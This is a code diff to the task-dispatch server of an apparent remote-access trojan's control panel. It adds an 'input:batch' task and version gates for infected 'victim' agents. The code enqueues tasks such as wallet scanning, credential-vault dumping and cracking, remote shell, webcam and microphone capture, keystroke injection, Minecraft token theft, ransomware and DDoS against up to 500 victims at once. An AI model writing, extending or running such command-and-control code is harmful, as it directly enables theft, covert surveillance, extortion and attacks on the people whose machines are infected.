@@ -13,7 +13,7 @@ import { compareVersion } from '../lib/agent-compat';
 import { capabilityMissing } from '../lib/agent-contract';
 import { mimeFor } from '../lib/mime';
 
-const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'webcam:snapshot', 'webcam:stream', 'webcam:devices', 'mic', 'mic:record', 'desktop:frame', 'desktop:screens', 'input:mouse', 'input:key', 'clipboard:get', 'minecraft:token', 'ransomware', 'ddos'] as const;
+const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'webcam:snapshot', 'webcam:stream', 'webcam:devices', 'mic', 'mic:record', 'desktop:frame', 'desktop:screens', 'input:mouse', 'input:key', 'input:batch', 'clipboard:get', 'minecraft:token', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
   victim_ids: z.array(z.string().uuid()).min(1).max(500),
@@ -102,7 +102,7 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     const input = enqueueSchema.parse(request.body);
     const victims = await prisma.victim.findMany({
       where: { id: { in: input.victim_ids }, revokedAt: null },
-      select: { id: true, hostname: true, agentVersion: true, capabilities: true, discord: { select: { channelId: true, missingAt: true } } }
+      select: { id: true, hostname: true, agentVersion: true, capabilities: true, contractVersion: true, discord: { select: { channelId: true, missingAt: true } } }
     });
     if (victims.length === 0) throw bad('no_victims', 'no live victim in selection');
     // Older agents reject parameters and tasks introduced in 0.3.7. Degrade
@@ -114,11 +114,15 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     if ((input.name === 'webcam' || input.name === 'mic' || input.name.startsWith('webcam:') || input.name === 'mic:record') && staleAgent('0.3.7')) {
       throw bad('agent_old', `${input.name} requiere agente 0.3.7; actualiza el JAR de la víctima`, 409);
     }
+    const NEW_IN_041 = ['clip_set', 'desktop:frame', 'desktop:screens', 'input:mouse', 'input:key', 'input:batch', 'clipboard:get', 'minecraft:token'];
+    if (NEW_IN_041.includes(input.name) && staleAgent('0.4.1')) {
+      throw bad('agent_old', `${input.name} requiere agente 0.4.1; actualiza el JAR de la víctima`, 409);
+    }
     const invalid = validateParams(input.name, input.params);
     if (invalid) throw bad('invalid_params', invalid, 422);
     // v2 capability gate: an implemented endpoint can still be absent on this
     // agent. The panel hides it, but scripts get a typed 501 instead of silence.
-    const missing = victims.filter((victim) => capabilityMissing(victim.capabilities, input.name, input.params));
+    const missing = victims.filter((victim) => victim.contractVersion >= 2 && capabilityMissing(victim.capabilities, input.name, input.params));
     if (missing.length > 0) {
       throw new HttpError(501, 'capability_not_implemented',
         `capability not implemented by ${missing.map((victim) => victim.hostname).join(', ')}`, 0,
